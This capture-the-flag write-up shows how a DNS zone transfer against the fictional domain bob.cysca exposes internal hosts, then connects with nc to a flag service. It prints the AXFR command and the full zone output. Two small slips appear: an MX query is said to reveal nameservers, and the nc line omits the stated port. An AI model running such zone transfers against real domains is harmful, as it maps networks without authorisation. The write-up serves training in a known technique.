Corporate Pentest 1 writeup *Zonedv6*

___
We were initially given the domain bob.cysca

If we do host -t mx bob.cysca we see that it's DNS is managed by ns.bob.cysca and ns6.bob.cysca

Attempting a zone transfer with *nslookup -type=axfr bob.cysca ns6.bob.cysca* gave us the output
___
bob.cysca
    origin = ns.bob.cysca
    mail addr = admin.bob.cysca
    serial = 2018020402
    refresh = 28800
    retry = 7200
    expire = 864000
    minimum = 86400
bob.cysca    nameserver = ns.bob.cysca.
bob.cysca    nameserver = ns6.bob.cysca.
Name:    bob.cysca
Address: fc00:1337:1::33b5:33b5
Name:    bob.cysca
Address: 172.16.5.53
flag.udp.bob.cysca    service = 10 10 34532 axfr6flag.bob.cysca.
Name:    aircon.bob.cysca
Address: fc00:1337:1::a17c:4
Name:    axfr6flag.bob.cysca
Address: fc00:1337:1::af76:f1a6
Name:    devbox.dev.bob.cysca
Address: 10.10.5.22
Name:    gitlab.dev.bob.cysca
Address: 10.10.5.116
Name:    glrunner.dev.bob.cysca
Address: 10.10.5.166
Name:    www.dev.bob.cysca
Address: 10.10.5.80
Name:    ns.bob.cysca
Address: 172.16.5.53
Name:    ns6.bob.cysca
Address: fc00:1337:1::10
Name:    custdata.safe.bob.cysca
Address: 10.10.5.192
Name:    w1.bob.cysca
Address: 10.10.5.112
Name:    w1.bob.cysca
Address: fc00:1337:2::3075:7104
Name:    w2.bob.cysca
Address: 10.10.5.113
Name:    www.bob.cysca
Address: fc00:1337:1::33b5:33b5
Name:    www.bob.cysca
Address: 172.16.5.53
bob.cysca
    origin = ns.bob.cysca
    mail addr = admin.bob.cysca
    serial = 2018020402
    refresh = 28800
    retry = 7200
    expire = 864000
    minimum = 86400
___
From this we can see axfr6flag.bob.cysca has a service running on port 34532

using openbsd-nc we can connect to it by executing

*nc -6v axfr6flag.bob.cysca* 

and it will print the flag
